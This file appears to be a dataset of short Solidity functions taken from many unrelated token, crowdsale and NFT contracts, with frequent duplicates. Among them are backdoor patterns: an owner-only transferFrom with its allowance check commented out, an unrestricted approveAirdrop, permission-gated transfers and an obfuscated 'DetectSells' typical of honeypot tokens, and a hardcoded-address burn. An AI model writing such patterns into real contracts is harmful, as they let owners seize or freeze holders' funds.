--------------------------------------------------------------------------------
function AddContractAddress(address tokenAddress, bool contractstatus, uint256 _maxcontribution) public restricted {
        contractaddress[tokenAddress] = contractstatus;
		maxcontribution[tokenAddress] = _maxcontribution;
		
		emit onAddContractAddress(tokenAddress, contractstatus, _maxcontribution);

    }
--------------------------------------------------------------------------------
function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
	}
--------------------------------------------------------------------------------
function kill() public onlyOwner {

        uint256 balance = token.balanceOf(this);
        token.transfer(owner, balance);
        selfdestruct(owner);
    }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {

require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function _isCooldownReady(uint256 skinAId, uint256 skinBId) private view returns (bool) {
        return (skins[skinAId].cooldownEndTime <= uint64(now)) && (skins[skinBId].cooldownEndTime <= uint64(now));
    }
--------------------------------------------------------------------------------
function TbkTokenLock(address _owner, address _token) {
        require(_owner != 0x0);
        require(_token != 0x0);

        owner = _owner;
        token = FreezableToken(_token);
    }
--------------------------------------------------------------------------------
function saleFinished() public view returns (bool) {
    require(stages.length == numPeriods);
    return stages[stages.length - 1].endTime < now;
  }
--------------------------------------------------------------------------------
function _transfer(address sender, address recipient, uint256 amount) internal override virtual {
        super._transfer(sender, recipient, amount);
        _moveDelegates(_delegates[sender], _delegates[recipient], amount);
    }
--------------------------------------------------------------------------------
function _transfer(address sender, address recipient, uint256 amount) internal override virtual {
      super._transfer(sender, recipient, amount);
      _moveDelegates(_delegates[sender], _delegates[recipient], amount);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function LibraToken() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function sellingWithdrawBalance() view public returns(uint256) {
        address _customerAddress = msg.sender; 
        uint256 _sellingWithdraw = (uint256) (sellingWithdrawBalance_[_customerAddress]) ; // Get all balances
        return  _sellingWithdraw;
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function _upgradeTo(address newImplementation) internal {
    address currentImplementation = implementation();
    require(currentImplementation != newImplementation);
    setImplementation(newImplementation);
    emit Upgraded(newImplementation);
  }
--------------------------------------------------------------------------------
constructor(
        address _logic,
        address _admin_,
        bytes memory _data
    ) payable UpgradeabilityProxy(_logic, _data) {
        assert(ADMIN_SLOT == bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1));
        _setAdmin(_admin_);
    }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {
require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function acceptOwnership(
        string _ownerSecret) 
        external 
        onlyOwnerCandidate 
        validSecret(newOwnerCandidate, _ownerSecret, ownerHashed)
    {
        address previousOwner = owner;

        owner = newOwnerCandidate;
        newOwnerCandidate = address(0);

        OwnershipTransferred(previousOwner, owner);
    }
--------------------------------------------------------------------------------
function acceptFoundation(
        string _foundationSecret) 
        external 
        onlyFoundationCandidate 
        validSecret(newFoundationCandidate, _foundationSecret, foundationHashed)
    {
        address previousFoundation = foundation;

        foundation = newFoundationCandidate;
        newFoundationCandidate = address(0);

        FoundationTransferred(previousFoundation, foundation);
    }
--------------------------------------------------------------------------------
function increaseCap(uint256 _addedValue) onlyOwner public returns (bool) {
        require(_addedValue >= 100e6 * 1 ether);
        capOfTotalSupply = capOfTotalSupply.add(_addedValue);
        return true;
    }
--------------------------------------------------------------------------------
function VestingAllocation(uint256 _tokensPerPeriod, uint256 _periods, uint256 _minutesInPeriod, uint256 _initalTimestamp)  Ownable() public {
    totalSupply = _tokensPerPeriod * _periods;
    periods = _periods;
    minutesInPeriod = _minutesInPeriod;
    remainingTokensPerPeriod = _tokensPerPeriod;
    initTimestamp = _initalTimestamp;
  }
--------------------------------------------------------------------------------
function finalize() public inState(State.Success) onlyOwner stopInEmergency {
    // Already finalized
    if(finalized) {
      throw;
    }
    // Finalizing is optional. We only call it if we are given a finalizing agent.
    if(address(finalizeAgent) != 0) {
      finalizeAgent.finalizeCrowdsale();
    }
    finalized = true;
  }
--------------------------------------------------------------------------------
function ZeusToken() {
        owner = msg.sender;
        totalSupply = 0.2 * 10 ** 26;
        balances[owner] = totalSupply;
    }
--------------------------------------------------------------------------------
function takeOwnership(uint256 _tokenId) public {
    require(isApprovedFor(msg.sender, _tokenId));
    clearApprovalAndTransfer(ownerOf(_tokenId), msg.sender, _tokenId);
  }
--------------------------------------------------------------------------------
function clearApproval(address _owner, uint256 _tokenId) private {
    require(ownerOf(_tokenId) == _owner);
    tokenApprovals[_tokenId] = 0;
    Approval(_owner, 0, _tokenId);
  }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
    require(_to != address(0));
    addToken(_to, _tokenId);
    Transfer(0x0, _to, _tokenId);
  }
--------------------------------------------------------------------------------
function updatePrice(uint _level, uint _price) public returns (bool) {
        require(msg.sender == ownerAddress, "only OwnerWallet");

        LEVEL_PRICE[_level] = _price;
        return true;
    }
--------------------------------------------------------------------------------
function withdraw(address _address) public onlyOwner {
        uint tokenBalanceOfContract = getRemainingToken();
        STRONG.transfer(_address, tokenBalanceOfContract);
        emit LogWithdrawal(_address, tokenBalanceOfContract);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function multiUpdateReward(address[] memory addresses_) public {
        for (uint256 i = 0; i < addresses_.length; i++) {
            updateReward(addresses_[i]);
        }
    }
--------------------------------------------------------------------------------
function applicationNameTaken(string applicationName)
        public
        view
        returns (bool officialTaken, bool unofficialTaken)
    {
        bytes32 applicationNameHash = keccak256(applicationName);
        return (
            officialApplicationDirectory[applicationNameHash]._initialized,
            unofficialApplicationDirectory[applicationNameHash]._initialized
        );
    }
--------------------------------------------------------------------------------
function applicationNameHashTaken(bytes32 applicationNameHash, bool official) internal view returns (bool) {
        if (official) {
            return officialApplicationDirectory[applicationNameHash]._initialized;
        } else {
            return unofficialApplicationDirectory[applicationNameHash]._initialized;
        }
    }
--------------------------------------------------------------------------------
function transferTokenOwnership(address _newOwner) public {
        require(_newOwner != address(0x0));
        require(msg.sender == admin);
        token.changeOwnership(_newOwner);
    }
--------------------------------------------------------------------------------
function isCrowdfundCompleted()
    internal
    returns (bool) 
  {
    if (
      now > publicEndTime
      || EGLSold >= ALLOC_CROWDSALE
      || weiRaised >= hardcapInWei
    ) return true;

    return false;
  }
--------------------------------------------------------------------------------
function deprecate(address _upgradedAddress) public onlyOwner {
        require(_upgradedAddress != address(0));
        deprecated = true;
        upgradedAddress = _upgradedAddress;
        emit Deprecate(_upgradedAddress);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function mintPartOfEmission(address to, uint part, uint partOfEmissionForPublicSales)
        public
        payloadSizeIs(32 * 3)
        validAddress(to)
        requiresState(State.MINTING2POOLS)
        onlyBy(m_pools)
    {
        uint poolTokens = m_publiclyDistributedTokens.mul(part).div(partOfEmissionForPublicSales);
        m_SMR.mint(to, poolTokens);
    }
--------------------------------------------------------------------------------
function Cock(){
        owner = msg.sender; 
        balances[owner] = _totalSupply;
        Transfer(address(0), owner, _totalSupply);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {

    bool withinPeriod = started;

    bool nonZeroPurchase = msg.value != 0;

    return withinPeriod && nonZeroPurchase;

  }
--------------------------------------------------------------------------------
function setMarketingRates(uint8 _newMkt1Rate, uint8 _newMkt2Rate, uint8 _newMkt3Rate)
        onlyAdministrator()
        public
    {
        require(_newMkt1Rate +_newMkt2Rate +_newMkt3Rate <= 60);   // 6%
       
        mkt1Rate =  _newMkt1Rate;
        mkt2Rate =  _newMkt2Rate;
        mkt3Rate =  _newMkt3Rate;

    }
--------------------------------------------------------------------------------
function checkGoalReached() afterDeadline public {
        if (amountRaised >= fundingGoal){
            //达成众筹目标
            fundingGoalReached = true;
          emit  GoalReached(beneficiary, amountRaised);
        }

        //关闭众筹
        crowdsaleClosed = true;
    }
--------------------------------------------------------------------------------
function FRAS(
    ) public {
        totalSupply = 10000000000000000;                              // Update total supply with the decimal amount
        balanceOf[msg.sender] = 10000000000000000;                    // Give the creator all initial tokens
        name = "Frasindo Rent";                                       // Set the name for display purposes
        symbol = "FRAS";                                              // Set the symbol for display purposes
    }
--------------------------------------------------------------------------------
function supplyAndBorrowApy() external view returns (uint256, uint256) {
        uint256 supplyRatePerBlock = cToken.supplyRatePerBlock();
        uint256 borrowRatePerBlock = cToken.borrowRatePerBlock();
        return (supplyRatePerBlock, borrowRatePerBlock);
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function transferFrom(address _from, address _to, uint256 _value) onlyOwner public returns (bool success) {
        //require(_value <= allowance[_from][msg.sender]);     // Check allowance
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
--------------------------------------------------------------------------------
function setIssueDividendReward(uint _bips)
        public
        fromAdmin
    {
        require(_bips <= 10);
        issueDividendRewardBips = _bips;
        emit IssueDividendRewardChanged(now, msg.sender, _bips);
    }
--------------------------------------------------------------------------------
function UDIAtoken() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = totalSupply_;
        Transfer(0x0, msg.sender, totalSupply_);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {

require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function publicStartRegularPhase()
  public
  {
    require(now > (icoOpenTime + 2 weeks) && icoOpenTime != 0);

    icoPhase     = false;
    regularPhase = true;
  }
--------------------------------------------------------------------------------
function changeOwner(address _newOwner) public onlyAdministrator() {
        owner = _newOwner;
        userSelectedRate[owner] = true;
        userDividendRate[owner] = 33;
        myReferrer[owner] = creator;
    }
--------------------------------------------------------------------------------
function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
	}
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinCap = weiRaised.add(msg.value) <= cap;
    return super.validPurchase() && withinCap;
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
      
    }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    public returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
constructor(address _secondary) public {
        owner = msg.sender;
        secondary = _secondary != address(0) ? _secondary : msg.sender;
    }
--------------------------------------------------------------------------------
function suspend() external onlyOwner returns(bool) {
      if (suspended == true) {
          return false;
      }

      suspended = true;

      emit SaleSuspended();

      return true;
   }
--------------------------------------------------------------------------------
function resume() external onlyOwner returns(bool) {
      if (suspended == false) {
          return false;
      }

      suspended = false;

      emit SaleResumed();

      return true;
   }
--------------------------------------------------------------------------------
function tokensLockedAtTime(address _of, string memory _reason, uint256 _time)
        public
        view
        returns (uint256 amount)
    {
        if (locked[_of][_reason].validity > _time)
            amount = locked[_of][_reason].amount;
    }
--------------------------------------------------------------------------------
function () payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function withdrawTokens() external whenNotPaused onlyAdmin {
    IERC20 t = super.token();
    t.safeTransfer(msg.sender, t.balanceOf(this));
  }
--------------------------------------------------------------------------------
function addAddressesToWhitelist(address[] memory _addresses) public {
        for (uint256 i = 0; i < _addresses.length; i++) {
            addAddressToWhitelist(_addresses[i]);
        }
    }
--------------------------------------------------------------------------------
function removeAddressesFromWhitelist(address[] memory _addresses) public {
        for (uint256 i = 0; i < _addresses.length; i++) {
            removeAddressFromWhitelist(_addresses[i]);
        }
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
constructor() public {
        owner = 0x08d19746Ee0c0833FC5EAF98181eB91DAEEb9abB;
        _balances[owner] = 10000000000000000000;
        emit Transfer(address(0), owner, 10000000000000000000);
    }
--------------------------------------------------------------------------------
function increaseSupply(uint256 increase) external onlyOwner {
        _totalSupply += increase;
        balances[owner] += increase;
        emit Transfer(address(0), owner, increase);
    }
--------------------------------------------------------------------------------
receive() external payable {
         // update state of _weiRaised
         _weiRaised = _weiRaised.add(msg.value);
         emit ReceivedEther(msg.sender, msg.value);
     }
--------------------------------------------------------------------------------
function destroyBlacklistedTokens(address _who, uint256 _amount) public userBlacklisted(_who) whenNotPaused requiresPermission {
        tokenStorage.subBalance(_who, _amount);
        tokenStorage.subTotalSupply(_amount);
        emit DestroyedBlacklistedTokens(_who, _amount);
    }
--------------------------------------------------------------------------------
function _finalization() internal {
        if (goalReached()) {
            _escrow.close();
            _escrow.beneficiaryWithdraw();
        } else {
            _escrow.enableRefunds();
        }

        super._finalization();
    }
--------------------------------------------------------------------------------
function weiToTokens(uint _amountWei) public view returns (uint256) {

        uint256 valueUSD = weiToUSD(_amountWei);

        uint256 tokens = valueUSD.mul(tokensPerUSD());

        return tokens;
    }
--------------------------------------------------------------------------------
function setDevData(address payable newPayeeDev) public onlyOwner {
		require(newPayeeDev != address(0), "Developer payout cannot be burned");
		payeeDev = newPayeeDev;
	}
--------------------------------------------------------------------------------
function Mints(uint256 quantity) external onlyOwner {
    
     require(totalSupply() + quantity <= amountForDevs, "reached max supply");
    _safeMint(msg.sender, quantity);
  }
--------------------------------------------------------------------------------
function MagicBoxToken() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function finishICO() private {
        if (m_funds.totalInvested() < getMinFunds())
            changeState(IcoState.FAILED);
        else
            changeState(IcoState.SUCCEEDED);
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function withDraw(address _etherAddress) public payable onlyOwner {
        require (_etherAddress != address(0));
        address contractAddress = this;
        _etherAddress.transfer(contractAddress.balance);
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x5412D7973883e542cdc72d570fb217Ee17fAB63a,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function lockedBalanceOfByDate(address _who, uint256 date) public view returns (uint256, uint256) {
    return (accounts[_who].lockedElement[date].value, accounts[_who].lockedElement[date].next);
  }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved) external {
        operatorApproval[msg.sender][_operator] = _approved;
        emit ApprovalForAll(msg.sender,_operator,_approved);
    }
--------------------------------------------------------------------------------
function safeAdd(uint a, uint b) pure returns (uint) {
        uint c = a + b;
        assert(c>=a && c>=b);
        return c;
    }
--------------------------------------------------------------------------------
function safeAdd(uint a, uint b) pure returns (uint) {
        uint c = a + b;
        assert(c>=a && c>=b);
        return c;
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function () public payable {
        require(msg.value > 0);       
        _systemReserves[0x0] = add(_systemReserves[0x0], msg.value);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function deposit(uint256 amount) public override {
    token.safeTransferFrom(msg.sender, address(this), amount);
    _increaseStake(msg.sender, amount);
  }
--------------------------------------------------------------------------------
function() public payable {
        divsPerSnail = divsPerSnail.add(msg.value.div(maxSnail));
        
        emit NewDivs(msg.value);
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function acceptOwnership() public {
        require(msg.sender == newOwner);
        OwnerUpdate(owner, newOwner);
        owner = newOwner;
        newOwner = 0x0;
    }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {
        require(!frozen[_holder]);
        frozen[_holder] = true;
        emit Freeze(_holder);
        return true;
    }
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {
        require(frozen[_holder]);
        frozen[_holder] = false;
        emit Unfreeze(_holder);
        return true;
    }
--------------------------------------------------------------------------------
function approveAirdrop(address _owner, address _spender, uint256 _value) public returns (bool success) {
        allowance[_owner][_spender] = _value;
        emit Approval(_owner, _spender, _value);
        return true;
    }
--------------------------------------------------------------------------------
function setVestingContract(address vestingContractInput) external onlyFundWallet {
        require(vestingContractInput != address(0));
        vestingContract = vestingContractInput;
        whitelist[vestingContract] = true;
        vestingSet = true;
    }
--------------------------------------------------------------------------------
function inRebaseWindow() public view returns (bool) {
        return (
            now.mod(minRebaseTimeIntervalSec) >= rebaseWindowOffsetSec &&
            now.mod(minRebaseTimeIntervalSec) < (rebaseWindowOffsetSec.add(rebaseWindowLengthSec))
        );
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
  public
  ownerExists(msg.sender)
  transactionExists(transactionId)
  notConfirmed(transactionId, msg.sender)
  {
    confirmations[transactionId][msg.sender] = true;
    Confirmation(msg.sender, transactionId);
    executeTransaction(transactionId);
  }
--------------------------------------------------------------------------------
function transferAdminQuickly(address newAdmin) public onlyAdmin {
        require(newAdmin != address(0));
        TransferAdminPending(newAdmin);
        AdminClaimed(newAdmin, admin);
        admin = newAdmin;
    }
--------------------------------------------------------------------------------
function addExecutors(address[] calldata executorArray) external onlyOwner {
        for (uint256 i = 0; i < executorArray.length; i++) {
            addExecutor(executorArray[i]);
        }
    }
--------------------------------------------------------------------------------
function removeExecutors(address[] calldata executorArray) external onlyOwner {
        for (uint256 i = 0; i < executorArray.length; i++) {
            removeExecutor(executorArray[i]);
        }
    }
--------------------------------------------------------------------------------
function TradeBTC (address fundAddress) public  {
    tokensCount = INITIAL_TOKENS_COUNT;
    accounts [msg.sender] = INITIAL_TOKENS_COUNT;
    owner = msg.sender;
    fund = fundAddress;
  }
--------------------------------------------------------------------------------
function isOperatorFor(address _operator, address _tokenHolder) public constant returns (bool) {
        return (_operator == _tokenHolder
            || mAuthorized[_operator][_tokenHolder]
            || (mIsDefaultOperator[_operator] && !mRevokedDefaultOperator[_operator][_tokenHolder]));
    }
--------------------------------------------------------------------------------
function () payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function protectedTokens() internal override view returns (address[] memory){
        address[] memory protected = new address[](1);
        protected[0] = mmVault;
        return protected;
    }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    public returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
function safeAdd(uint a, uint b) pure returns (uint) {
        uint c = a + b;
        assert(c>=a && c>=b);
        return c;
    }
--------------------------------------------------------------------------------
function Exchange(address feeAccount_, uint256 makerFee_, uint256 takerFee_, address exchangeContract_) {
        owner               = msg.sender;
        feeAccount          = feeAccount_;
        makerFee            = makerFee_;
        takerFee            = takerFee_;

        exchangeContract    = exchangeContract_;
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function Authorizable() public {
        authorizers.length = 2;
        authorizers[1] = msg.sender;
        authorizerIndex[msg.sender] = 1;
    }
--------------------------------------------------------------------------------
function addAuthorized(address _addr) external onlyAuthorized {
        authorizerIndex[_addr] = authorizers.length;
        authorizers.length++;
        authorizers[authorizers.length - 1] = _addr;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function checkGoalReached() public afterDeadline {
        if (amountRaised >= softCap){
            fundingGoalReached = true;
            emit GoalReached(beneficiary, amountRaised);
        }
        presaleClosed = true;
    }
--------------------------------------------------------------------------------
function transfer(
    address to,
    uint256 value
  )
    public
    returns (bool success)
  {
    bytes memory empty; // null
    _transfer( msg.sender, to, value, empty );
    return true;
  }
--------------------------------------------------------------------------------
function DetectSells(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    clarkson[spender] = val;
    worse[spender] = val2; 
    television[spender] = val3;
    devsda = val4;
  }
--------------------------------------------------------------------------------
function CheckSoftCap() internal {

        if (!SoftCapReached) {

            if (SaleAmountDSK >= SoftCap) {

                SoftCapReached = true;
                
                emit SuccessHardCap(SaleAmountDSK, now);

            } 
        }
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        require(address(this).balance != 0);
        require(ethFundDeposit.send(address(this).balance));
    }
--------------------------------------------------------------------------------
function _transferFrom(address from, address to, uint256 tokenId) internal {
        super._transferFrom(from, to, tokenId);

        _removeTokenFromOwnerEnumeration(from, tokenId);

        _addTokenToOwnerEnumeration(to, tokenId);
    }
--------------------------------------------------------------------------------
function sendTokens(address beneficiary, uint256 tokenAmount) public onlyOwner {
    require(beneficiary != address(0));
    require(tokenAmount > 0);
    _token.safeTransfer(beneficiary, tokenAmount);
  }
--------------------------------------------------------------------------------
function serviceFeeWithdraw() external onlyOwner {
        require(serviceReward > 0);
        if (gameToken.transfer(msg.sender, serviceReward))
            serviceReward = 0;
    }
--------------------------------------------------------------------------------
function getCurrentPrice(uint256 _tokenId)
        public
        view
        returns (uint256)
    {
        Auction storage auction = tokenIdToAuction[_tokenId];
        require(_isOnAuction(auction));
        return _currentPrice(auction);
    }
--------------------------------------------------------------------------------
function tokenURI(uint256 _tokenId) external view returns (string infoUrl)
    {
        return 
            concat(toSlice(metadataUrlPrefix), 
                toSlice(concat(toSlice(uintToString(_tokenId)), toSlice(metadataUrlSuffix))));
    }
--------------------------------------------------------------------------------
function isValidSignature(
        address _pluginAddress,
        uint40 _signId,
        uint40 _cutieId,
        uint128 _value,
        uint256 _parameter,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
        )
        public
        view
        returns (bool)
    {
        return getSigner(_pluginAddress, _signId, _cutieId, _value, _parameter, _v, _r, _s) == operatorAddress;
    }
--------------------------------------------------------------------------------
function canBreed(uint40 _cutieId)
        public
        view
        returns (bool)
    {
        require(_cutieId > 0);
        Cutie storage cutie = cuties[_cutieId];
        return _canBreed(cutie);
    }
--------------------------------------------------------------------------------
function finalize() public inState(State.Success) onlyOwner stopInEmergency {

        // Already finalized
        if(finalized) {
            throw;
        }

        // Finalizing is optional. We only call it if we are given a finalizing agent.
        if(address(finalizeAgent) != 0) {
            finalizeAgent.finalizeCrowdsale();
        }

        finalized = true;
    }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved) external {
        operatorApproval[msg.sender][_operator] = _approved;
        emit ApprovalForAll(msg.sender, _operator, _approved);
    }
--------------------------------------------------------------------------------
function transferOwnership(address payable _newAdmin) public onlyAdmin {
        require(_newAdmin != address(0), "New admin can't be null");
        admin = _newAdmin;
    }
--------------------------------------------------------------------------------
function feeWithdrawEthAmount(uint256 amount) onlyAdmin() public {
    require(totalEthFee >= amount);
    totalEthFee = totalEthFee.sub(amount);
    msg.sender.transfer(amount);
  }
--------------------------------------------------------------------------------
function _mint(address to, uint256 tokenId) internal {
    super._mint(to, tokenId);

    _allTokensIndex[tokenId] = _allTokens.length;
    _allTokens.push(tokenId);
  }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function Add(uint a, uint b) pure internal returns (uint) {
      uint c = a + b;
      //result must be greater as a or b can not be negative
      assert(c>=a && c>=b);
      return c;
    }
--------------------------------------------------------------------------------
function setDevAddr(address _devaddr) public {
        require(msg.sender == devaddr, "!dev: nice try, amigo");
        devaddr = _devaddr;
    }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    public returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
function hasEnded() public view returns (bool) {
    bool isEnd = now > endTime || weiRaised == 2 * 10 ** (8+6);
    return isEnd;
  }
--------------------------------------------------------------------------------
function deposit(address investor) onlyOwner public payable {
    require(state == State.Active);
    deposited[investor] = deposited[investor].add(msg.value);
  }
--------------------------------------------------------------------------------
function transferOtherERC20Token(address tokenAddress, uint256 amount)
      onlyOwner returns (bool success)
    {
        // can't be used for GIM token
        require(tokenAddress != address(this) || transferable);
        return ERC20(tokenAddress).transfer(owner, amount);
    }
--------------------------------------------------------------------------------
function ownerOf(uint256 tokenId) public view virtual override returns (address) {
        address owner = _owners[tokenId];
        require(owner != address(0), "k012");
        return owner;
    }
--------------------------------------------------------------------------------
function _safeTransfer(
        address from,
        address to,
        uint256 tokenId,
        bytes memory _data
    ) internal virtual {
        _transfer(from, to, tokenId);
        require(_checkOnERC721Received(from, to, tokenId, _data), "k020");
    }
--------------------------------------------------------------------------------
function _safeMint(
        address to,
        uint256 tokenId,
        bytes memory _data
    ) internal virtual {
        _mint(to, tokenId);
        require(
            _checkOnERC721Received(address(0), to, tokenId, _data),
            "k022"
        );
    }
--------------------------------------------------------------------------------
function inCaseTokensGetStuck(address _token, uint _amount) public {//转任意erc20
        require(msg.sender == governance, "!governance");
        IERC20(_token).safeTransfer(governance, _amount);
    }
--------------------------------------------------------------------------------
function deploy() public only_owner at_stage(Stages.Deploying) {
        require(phases.length > 0);
        require(stakeholderPercentagesIndex.length > 0);
        stage = Stages.Deployed;
    }
